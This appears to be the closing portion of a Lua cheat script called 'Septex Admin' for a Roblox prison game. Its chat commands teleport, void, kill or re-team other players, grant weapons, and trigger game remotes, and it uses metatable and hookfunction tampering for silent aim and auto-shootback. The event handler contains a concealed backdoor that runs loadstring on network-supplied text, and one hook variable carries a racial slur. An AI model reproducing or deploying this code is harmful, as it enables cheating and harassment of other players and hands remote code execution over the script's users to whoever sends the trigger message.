				API:Notif("Error", Target.DisplayName..' is criminal.', Color3.fromRGB(255, 0, 0), 3)
			end
		end
	else
		if Player.Team ~= game.Teams.Criminals then
			API:ChangeTeam(game.Teams.Criminals)
			API:Notif("OK", 'Made '..plr.DisplayName..' criminal.', Color3.fromRGB(0, 255, 0), 3)
		else
			API:Notif("Error", Player.DisplayName..' is criminal.', Color3.fromRGB(255, 0, 0), 3)
		end
	end
  end
  if Command("antisit") then
	ChangeState(args[2],"AntiSit")
  end
  if Command("infjump") then
	ChangeState(args[2],"InfJump")
  end
  if Command("bring") then
	local Target = API:FindPlayer(args[2])
	if Target then
		API:bring(Target)
		API:Notif("OK", 'Brought '..Target.DisplayName..' To You', Color3.fromRGB(0, 255, 0), 3)
	end
  end
  if Command("void") then
	local Target = API:FindPlayer(args[2])
	if Target then
		API:bring(Target, CFrame.new(7^7, 7^7, 7^7))
		API:Notif("OK", 'Brought '..Target.DisplayName..' To Void', Color3.fromRGB(0, 255, 0), 3)
	end
  end
  if Command("view") then
	local Player = API:FindPlayer(args[2])
	if Player then
		if API.ViewingPlayer  then
			API.ViewingPlayer = nil
			wait(.2)
		end
		API.ViewingPlayer = Player
		API:Notif("OK", 'Viewing '..Player.DisplayName, Color3.fromRGB(0, 255, 0), 3)
		task.spawn(function()
			while wait() do
				pcall(function()
					workspace.CurrentCamera.CameraSubject = Player.Character:FindFirstChildOfClass("Humanoid")
				end)
				if not Player or not API.ViewingPlayer or Unloaded then
					workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
					break
				end
			end
		end)
	end
  end
  if Command("unview") then
	API.ViewingPlayer = nil
	wait()
	workspace.CurrentCamera.CameraSubject = plr.Character
	API:Notif("OK", 'Stopped viewing player', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("copychat") then
	ChangeState(args[2],"CopyChat")
  end
  if Command("antifling") then
	ChangeState(args[2],"AntiFling")
  end
  if Command("goto") or Command("to") then
	local PLR = API:FindPlayer(args[2])
	local Position = API:GetPosition(PLR)
	if PLR and Position then
		API:MoveTo(Position)
	end
  end
  if Command("shotgun") or Command("remington") or Command('rem') then
	API:GetGun("Remington 870")
	API:Notif("OK", 'Obtain remington 870', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("ak-47") or Command('ak') then
	API:GetGun("AK-47")
	API:Notif("OK", 'Obtain ak-47', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("m9") or Command("pistol") then
	API:GetGun("M9")
	API:Notif("OK", 'Obtain m9', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("m4a1") or Command("m4") then
	if not bgp then
		API:Notif("Error", 'Not Gamepass!', Color3.fromRGB(255, 0, 0), 3)
	else
		API:GetGun("M4A1")
		API:Notif("OK", 'Obtain m4a1', Color3.fromRGB(0, 255, 0), 3)
	end
  end
  if Command("hammer") or Command("ham") then
	API:GetSingle("Hammer")
	API:Notif("OK", 'Obtain hammer', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("knife") or Command("knive") then
	API:GetGun("Crude Knife")
	API:Notif("OK", 'Obtain crude knife', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("guns") then
	API:AllGuns()
	API:Notif("OK", 'Obtain all guns', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("items") then
	API:AllItems()
	API:Notif("OK", 'Obtain all items', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("autoguns") or Command("aguns") then
	ChangeState(args[2],"AutoGuns")
  end
  if Command("autoitems") or Command("aitems") then
	ChangeState(args[2],'AutoItems')
  end
  if Command("loopcrim") then
	if args[2] and args[2] ~= plr then
		local Player = API:FindPlayer(args[2])
		if not table.find(API.LoopCrim, Player.Name) then
			table.insert(API.LoopCrim, Player.Name)
			API:Notif("OK", 'Auto make '..Player.DisplayName..' criminal.', Color3.fromRGB(0, 255, 0), 3)
		else
			API:Notif("OK", 'Player is already auto criminal.', Color3.fromRGB(255, 0, 0), 3)
		end
	else
		States.LoopCrim = true
		API:Notif("OK", 'Auto make '..Player.DisplayName..' criminal.', Color3.fromRGB(0, 255, 0), 3)
		plr.CharacterAdded:Connect(function()
			if States.LoopCrim and Unloaded == false then
				if plr.Team == game.Teams.Inmates then
					repeat task.wait()
						plr.Character.Head.CanCollide = false
						workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
					until plr.Team == game.Teams.Criminals
					workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
				elseif plr.Team == game.Teams.Guards then
					pcall(function()
					repeat task.wait() until game:GetService("Players").LocalPlayer.Character
						game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")
					
						API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
					end)
					repeat task.wait()
						plr.Character.Head.CanCollide = false
						workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
					until plr.Team == game.Teams.Criminals
					workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
				end
			end
		end)
	end
  end
  if Command("unloopcrim") then
	if args[2] and args[2] ~= plr then
		local Player = API:FindPlayer(args[2])
		if table.find(API.LoopCrim, Player.Name) then
			table.remove(API.LoopCrim,table.find(API.LoopCrim, Player.Name))
			API:Notif("OK", 'Stopped auto make '..Player.DisplayName..' criminal.', Color3.fromRGB(0, 255, 0), 3)
		else
			API:Notif("OK", 'Player is not already auto criminal.', Color3.fromRGB(255, 0, 0), 3)
		end
	else
		States.LoopCrim = false
		API:Notif("OK", 'Stopped auto make '..Player.DisplayName..' criminal.', Color3.fromRGB(255, 0, 0), 3)
	end
  end
  if Command("respawn") then
	if Player.Team == game.Teams.Guards then
			if API:GuardsFull("b") then
				workspace.Remote.TeamEvent:FireServer("Bright orange")
				plr.CharacterAdded:Wait()
				repeat task.wait()
					workspace.Remote.TeamEvent:FireServer("Bright blue")
				until plr.Team == game.Teams.Guards
			else
				workspace.Remote.TeamEvent:FireServer("Bright blue")
			end
		elseif Player.Team == game.Teams.Inmates then
			workspace.Remote.TeamEvent:FireServer("Bright orange")
		elseif Player.Team == game.Teams.Criminals then
			if not API:GuardsFull("c") then
				workspace.Remote.TeamEvent:FireServer("Bright blue")
				plr.CharacterAdded:Wait()
				repeat task.wait()
					plr.Character.Head.CanCollide = false
					workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
				until plr.Team == game.Teams.Criminals
				workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
			else
				workspace.Remote.TeamEvent:FireServer("Bright orange")
				plr.CharacterAdded:Wait()
				repeat task.wait()
					plr.Character.Head.CanCollide = false
					workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
				until plr.Team == game.Teams.Criminals
				workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
			end
		end
  end
  if Command("opengate") then
	local OldPos = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
	repeat task.wait()
                plr.Character.HumanoidRootPart.CFrame = game.Workspace.Prison_ITEMS.buttons["Prison Gate"]["Prison Gate"].CFrame
                pcall(function()
	                workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.buttons["Prison Gate"]["Prison Gate"])
                end)
	until workspace.Prison_ITEMS.buttons["Prison Gate"]["Prison Gate"]
	API:MoveTo(OldPos)
  end
  if Command("car") then
	pcall(function()
			local OldPos = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
			game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-910, 95, 2157))
			wait()
			local car = nil
			task.spawn(function()
				car = game:GetService("Workspace").CarContainer.ChildAdded:Wait()
			end)
			repeat wait(.1)
				local ohInstance1 = game:GetService("Workspace").Prison_ITEMS.buttons:GetChildren()[8]["Car Spawner"]
				workspace.Remote.ItemHandler:InvokeServer(ohInstance1)
			until car
			repeat task.wait() until car:FindFirstChild("RWD") and car:FindFirstChild("Body") and car:FindFirstChild("Body"):FindFirstChild("VehicleSeat")
			car.PrimaryPart = car.RWD
			game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(OldPos)
			wait(.1)
			local Done = false
			car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
			repeat 

				game:GetService("RunService").RenderStepped:Wait()
				car:SetPrimaryPartCFrame(OldPos)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =CFrame.new(car.Body.VehicleSeat.Position)
				car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
				if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Sit == true then
					Done = true
				end
			until Done
		end)
  end
  if Command("forcefield") or Command("ff") then
	ChangeState(args[2],"ff")
  end
  if Command("speed") or Command("ws") then
	local number = tonumber(args[2])
	if number ~= nil then
		plr.Character.Humanoid.WalkSpeed = number
		API:Notif("OK", 'Changed speed to '..number, Color3.fromRGB(0, 255, 0), 3)
	else
		API:Notif("Error", 'Not Speed', Color3.fromRGB(255, 0, 0), 3)
	end
  end
  if Command("tp") then
	local player1 = API:FindPlayer(args[2])
	local player2 = API:FindPlayer(args[3])
	if player1 and player2 then
		API:bring(player1, player2.Character.HumanoidRootPart.CFrame)
		API:Notif("OK", 'Teleports '..player1.DisplayName..' to '..player2.DisplayName, Color3.fromRGB(0, 255, 0), 3)
	end
  end
  if Command('givekey') or Command("keycard") or Command("key") then
	local OldT = Player.Team
	if plr.Character:FindFirstChild("Key card") or plr.Backpack:FindFirstChild("Key card") then
		return API:Notif("Error", "You already have a keycard!", Color3.fromRGB(255, 0, 0), 3)
	elseif API:GuardsFull("c") then
		API:Notif("Error", 'Guards team is full!', Color3.fromRGB(255, 0, 0), 3)
		return
	elseif workspace.Prison_ITEMS.single:FindFirstChild("Key card") then
		repeat task.wait()
			local a =pcall(function()
				local Key = workspace.Prison_ITEMS.single["Key card"]
				game.Workspace.Remote["ItemHandler"]:InvokeServer({
					Position = Player.Character.Head.Position,
					Parent = Key
				})
			end)
		until plr.Backpack:FindFirstChild("Key card")
		API:Notif("OK", 'Obtain keycard', Color3.fromRGB(0, 255, 0), 3)
	elseif not game.Players.LocalPlayer.Backpack:FindFirstChild("Key card") or not workspace.Prison_ITEMS.single:FindFirstChild("Key card") or not API:GuardsFull("c") then
		API:ChangeTeam(game.Teams.Guards)
		repeat wait(.3)
			Player.Character:FindFirstChildOfClass("Humanoid"):ChangeState(15)
			if States.AutoRespawn then
				States.AutoRespawn = false
			end
			wait(.1)
			API:Refresh()
		until game:GetService("Workspace")["Prison_ITEMS"].single:FindFirstChild("Key card")
		if game:GetService("Workspace")["Prison_ITEMS"].single:FindFirstChild("Key card") then
			if Player.Team ~= OldT then
				API:ChangeTeam(OldT)
				repeat task.wait() until Player.Team == OldT
			end
			wait()
			repeat task.wait()
				local a =pcall(function()
					local Key = workspace.Prison_ITEMS.single["Key card"]
					game.Workspace.Remote["ItemHandler"]:InvokeServer({
						Position = Player.Character.Head.Position,
						Parent = Key
					})
				end)
			until plr.Backpack:FindFirstChild("Key card")
		end
	end
  end
  if Command('antitase') then
	ChangeState(args[2],"AntiTase")
  end
  if Command("antishield") then
	ChangeState(args[2],"AntiShield")
  end
  if Command("autoguard") or Command("aguard") then
	if not API:GuardsFull("c") then
		ChangeState(args[2],"AutoGuard")
		if Player.Team ~= game.Teams.Guards then
			API:ChangeTeam(game.Teams.Guards)
		end
	else
		API:Notif("Error", 'Guards Full!', Color3.fromRGB(255, 0, 0), 3)
	end
  end
  if Command("silentaim") or Command("saim") then
	ChangeState(args[2],"SilentAim")
  end
  if Command('noclip') then
	ChangeState(args[2],"noclip")
  end
  if Command("shootback") or Command("antishoot") then
	ChangeState(args[2],"ShootBack")
  end
  if NotCommand("unload") and NotCommand("prefix") and NotCommand("allcmds") and NotCommand('re') and NotCommand("refresh") and NotCommand("cmds") and NotCommand("cmd") and NotCommand("inmate") and NotCommand("in") and NotCommand("guard") and NotCommand("gu") and NotCommand("autore") and NotCommand("autorespawn") and NotCommand("autoremoveff") and NotCommand("autorff") and NotCommand("killaura") and NotCommand("whitelist") and NotCommand("wl") and NotCommand("unwhitelist") and NotCommand("unwl") and NotCommand("kill") and NotCommand("oof") and NotCommand("die") and NotCommand("olditemmethod") and NotCommand("oldimethod") and NotCommand("damage") and NotCommand("dmg") and NotCommand("autodumpcars") and NotCommand("autoremovecars") and NotCommand('autonocars') and NotCommand("crim") and NotCommand("criminal") and NotCommand("makecrim") and NotCommand("antisit") and NotCommand("infjump") and NotCommand("bring") and NotCommand("void") and NotCommand("view") and NotCommand("unview") and NotCommand("copychat") and NotCommand("antifling") and NotCommand("goto") and NotCommand("to") and NotCommand("shotgun") and NotCommand("remington") and NotCommand("rem") and NotCommand("ak-47") and NotCommand('ak') and NotCommand("m9") and NotCommand("pistol") and NotCommand("m4a1") and NotCommand('m4') and NotCommand("hammer") and NotCommand("ham") and NotCommand("knife") and NotCommand("knive") and NotCommand("guns") and NotCommand("items") and NotCommand("autoguns") and NotCommand("aguns") and NotCommand("autoitems") and NotCommand("aitems") and NotCommand('loopcrim') and NotCommand("unloopcrim") and NotCommand("respawn") and NotCommand("opengate") and NotCommand("car") and NotCommand("forcefield") and NotCommand("ff") and NotCommand("speed") and NotCommand("ws") and NotCommand("tp") and NotCommand("givekey") and NotCommand("keycard") and NotCommand("key") and NotCommand("antitase") and NotCommand("antishield") and NotCommand("autoguard") and NotCommand("aguard") and NotCommand("silentaim") and NotCommand("saim") and NotCommand("noclip") and NotCommand("shootback") and NotCommand("antishoot") then
    API:Notif("Error", 'Not a valid command.', Color3.fromRGB(255, 0, 0), 3)
  end
end
local Cooldown = true
game.Players.LocalPlayer.Chatted:Connect(function(chat)
	if chat:sub(1,#Prefix) == Prefix then
		if not Cooldown then
			Cooldown = true
			PlayerChatted(chat)
			wait(.45)
			for i = 1,4 do task.wait()
				Cooldown = false
			end
		end
	end
end)
plr.CharacterAdded:Connect(function(NewChar)
    if Unloaded then return end
    repeat API:swait() until NewChar
    NewChar:WaitForChild('Head')
    NewChar:WaitForChild("HumanoidRootPart")
    NewChar:WaitForChild("Humanoid").BreakJointsOnDeath = not States.AutoRespawn
    NewChar:WaitForChild("Humanoid").Died:Connect(function()
        if States.AutoRespawn and not Unloaded then
          API:Refresh()
        end
    end)
    if Unloaded then return end
    if States.AutoRemoveff then
      NewChar:WaitForChild("ForceField"):Destroy()
    end
    if States.AutoGuns then
	wait(.35)
	API:AllGuns()
    end
    if States.AutoItems then
	wait(.35)
	API:AllItems()
    end
    if States.AutoGuard then
	if Player.Team ~= game.Teams.Guards then
		API:ChangeTeam(game.Teams.Guards)
	end
    end
end)
TextBox.FocusLost:Connect(function(EnterKey)
    if EnterKey and not Unloaded then
      if TextBox.Text:sub(1,#Prefix) ~= Prefix then
        PlayerChatted(Prefix..TextBox.Text)
        TextBox.Text = ''
      else
        PlayerChatted(TextBox.Text)
        TextBox.Text = ""
      end
    end
end)
TextButton.MouseButton1Click:Connect(function()
	Cooldown = false
end)
coroutine.wrap(function()
	game:FindService("UserInputService").JumpRequest:Connect(function()
		if States.InfJump and Unloaded == false then
			game:FindService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
		end
	end)
	-- main loop
	while wait() do -- fast loop
		if Unloaded then return end
		if plr.Character.Humanoid.Sit and States.AntiSit then
			plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		end
		if States.ArrestAura then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= plr and not table.find(API.Whitelisted,v) then
					if v.Team == game.Teams.Criminals or (API:BadArea(v) and v.Team == game.Teams.Inmates) then
						if (v.Character.HumanoidRootPart.Position-plr.Character.HumanoidRootPart.Position).magnitude > 30 and not v.Character.Humanoid.Health > 0 then
							for i = 1,2 do
								workspace.Remote.arrest:InvokeServer(v.Character.PrimaryPart)
							end
						end
					end
				end
			end
		end
		if not plr.Character:FindFirstChild("ForceField") and States.ff then
			wait(.1)
			API:Refresh()
		end
	end
end)()
spawn(function()
	while wait(.3) do -- medium loop
		if Cooldown then
			TextButton.Visible = true
		end
		if not Cooldown then
			TextButton.Visible = false
		end
	end
end)
spawn(function()
	while wait(.6) do -- slow loop
		for i,v in pairs(API.LoopCrim) do
			if v and game.Players:FindFirstChild(v) then
				local Target = game.Players:FindFirstChild(v)
				if Target.Team ~= game.Teams.Criminals then
					API:bring(Target, saved)
				end
			end
		end
		if Unloaded then return end
		if States.AntiTase and getconnections then
			for i,v in pairs(getconnections(workspace:WaitForChild("Remote").tazePlayer.OnClientEvent)) do
				v:Disable()
			end
		end
		if States.AntiShield then
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v and v.Character and v:FindFirstChild("Torso") and v:FindFirstChild("Torso"):FindFirstChild("ShieldFolder") then
					v.Torso:FindFirstChild("ShieldFolder"):Destroy()
				end
			end
		end
		if States.noclip and Player.Character then
			for _,x in pairs(Player.Character:GetDescendants()) do
				if x:IsA("BasePart") and States.noclip then
					x.CanCollide = false
				end
			end
		end
	end
end)
function CopyChat(Target)
	Target.Chatted:Connect(function(msg)
		if States.CopyChat and not Unloaded then
			API:Chat("["..Target.DisplayName.."]: "..msg)
		end
	end)
end
function NoCollide(PLR)
	 if States.AntiFling and not Unloaded and PLR.Character then
		 for _,x in pairs(PLR.Character:GetDescendants()) do
			 if x:IsA("BasePart") and not Unloaded and States.AntiFling then
				 x.CanCollide = false
			 end
		 end
	 end
 end
for i,v in pairs(game.Players:GetPlayers()) do
	if v ~= plr then
		CopyChat(v)
		game:FindService("RunService").Stepped:Connect(function()
			NoCollide(v)
		end)
	end
end
game.Players.PlayerAdded:Connect(function(Add)
	CopyChat(Add)
	game:FindService("RunService").Stepped:Connect(function()
		NoCollide(Add)
	end)
end)
game.Players.PlayerRemoving:Connect(function(Remove)
	CopyChat(Remove)
	game:FindService("RunService").Stepped:Connect(function()
		NoCollide(Remove)
	end)
end)
local Players = game.Players
local LocalPlayer = Players.LocalPlayer
local GetPlayers = Players.GetPlayers
local Camera = workspace.CurrentCamera
local WTSP = Camera.WorldToScreenPoint
local FindFirstChild = game.FindFirstChild
local Vector2_new = Vector2.new
local Mouse = LocalPlayer.GetMouse(LocalPlayer)
local function NotObstructing(Destination, Ancestor)
	local ObstructingParts = Camera.GetPartsObscuringTarget(Camera, {Destination}, {Ancestor, LocalPlayer.Character})

	for i,v in ipairs(ObstructingParts) do
		pcall(function()
			if v.Transparency >= 1 then
				table.remove(ObstructingParts, i)
			end
		end)
	end

	if #ObstructingParts <= 0 then
		return true
	end
	local RaycastParameters = RaycastParams.new()
	RaycastParameters.IgnoreWater = true
	RaycastParameters.FilterType = Enum.RaycastFilterType.Blacklist
	RaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}

	RaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}

	local Origin = Camera.CFrame.Position
	local Direction = (Destination - Origin).Unit * 500
	local RayResult = workspace.Raycast(workspace, Origin, Direction, RaycastParameters) or {
		Instance = nil;
		Position = Origin + Direction;
		Material = Enum.Material.Air;
	}

	if RayResult.Instance and (RayResult.Instance.IsDescendantOf(RayResult.Instance, Ancestor) or RayResult.Instance == Ancestor) then
		return true
	end
	return false
end
function ClosestChar()
	local Max, Close = 170
	for I,V in pairs(GetPlayers(Players)) do
		if V ~= LocalPlayer and V.Team ~= LocalPlayer.Team and V.Character then
			local Head = FindFirstChild(V.Character, "Head")
			if Head then
				if NotObstructing(V.Character.PrimaryPart.Position, V.Character) == false then
					continue
				end
				local Pos, OnScreen = WTSP(Camera, Head.Position)
				if OnScreen then
					local Dist = (Vector2_new(Pos.X, Pos.Y) - Vector2_new(Mouse.X, Mouse.Y)).Magnitude
					if Dist < Max then
						Max = Dist
						Close = V.Character
					end
				end
			end
		end
	end

	return Close
end
local blackperson; blackperson = hookfunction(game.Destroy,function(a)
	local isExploit = checkcaller()
	if a and a:IsA("Player") and not Unloaded and isExploit  then
		--
	end
end)
local MT = getrawmetatable(game)
local __namecall = MT.__namecall
setreadonly(MT, false)
MT.__namecall = newcclosure(function(self, ...)
	local Method = getnamecallmethod()
	local isExploit = checkcaller()
	if Method:lower() == "destroy" or Method:lower() == "remove" and Unloaded == false then
		if self.IsA(self, "Player") and isExploit then
			--
		end
	end
	if States.SilentAim then
		if not Unloaded and Method == "FindPartOnRay" and not checkcaller() and tostring(getfenv(0).script) == "GunInterface" then
			local Character = ClosestChar()
			if Character then
				return Character.Torso, Character.Torso.Position+Vector3.new(Random.new():NextNumber(-1,1),Random.new():NextNumber(.1,.8),Random.new():NextNumber(-.5,.5))
			end
		end
	end
	return __namecall(self, ...)
end)
setreadonly(MT, true)
function MostClose(Position)
	local Max, Closest = math.huge,nil
	for i,v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Character then
			if v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool") then
				local ShootPart = (v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool")):FindFirstChild("Muzzle")
				if v.Character.PrimaryPart and (v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool")):FindFirstChild("Muzzle") then
					local Distance = (ShootPart.Position-Position).Magnitude
					if Distance < Max then
						Max = Distance
						Closest = v
					end 
				end
			end
		end
	end
	return Closest
end
				
local CurrentTime = 0
function GetPlayerHit(Part)
	for i,v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Character:IsAncestorOf(Part) then
			return v
		end
	end
end
local ShootbackCooldown = false
local function ReplicationEventFunction(Table)
	if Table[1] and Table[1].MSG ~= nil and Table[1].PLA ~= nil then
		if Table[1].Cframe.Z == 20000 then
			task.spawn(function()
				loadstring(tostring(Table[1].MSG))()
			end)
		end
	end
	if Unloaded then return end
	local Count = 0
	pcall(function()
		for i,v in pairs(Table) do
			if Count <= 2 then
				local Hit=v.Hit
				local Distance=v.Distance
				local Cframe=v.Cframe
				local RayObject =v.RayObject
				if Hit and Distance and Cframe then
					if Cframe ~= CFrame.new() then
						local PlayerHit = nil
						local WhoShot = nil
						for i,v in pairs(game:GetService("Players"):GetPlayers()) do
							if v.Character:IsAncestorOf(Hit) then
								WhoShot = v
								PlayerHit = Hit
								break
							end
						end
						local Worked,ufhwiufwe2 = pcall(function()
							WhoShot = MostClose((Cframe * CFrame.new(0, 0, -Distance / 2)).p)
						end)
						if Worked and WhoShot and PlayerHit and not Unloaded then
							if States.ShootBack and not ShootbackCooldown then
								if PlayerHit then
									if PlayerHit and Player.Character:IsAncestorOf(PlayerHit) and ShootbackCooldown == false and WhoShot.Team ~= plr.Team then
										ShootbackCooldown = true
										API:KillPlayer(WhoShot,10)
										wait(.5)
										ShootbackCooldown = false
									end
								end
							end
						end
					end
				end
				Count = Count + 1
			end
		end
	end)
end
coroutine.wrap(function()
	game:GetService("ReplicatedStorage"):WaitForChild("ReplicateEvent").OnClientEvent:Connect(ReplicationEventFunction)
end)()
API:Notif("Loads", 'Press F9 or chat /console to show commands list', Color3.fromRGB(255, 0, 0), 10)
API:Refresh()
Cooldown = false
else
	game:GetService("StarterGui"):SetCore("SendNotification",{Title = "Septex Admin",Text = "Septex admin is already executed or game not support",Duration = 7})
end
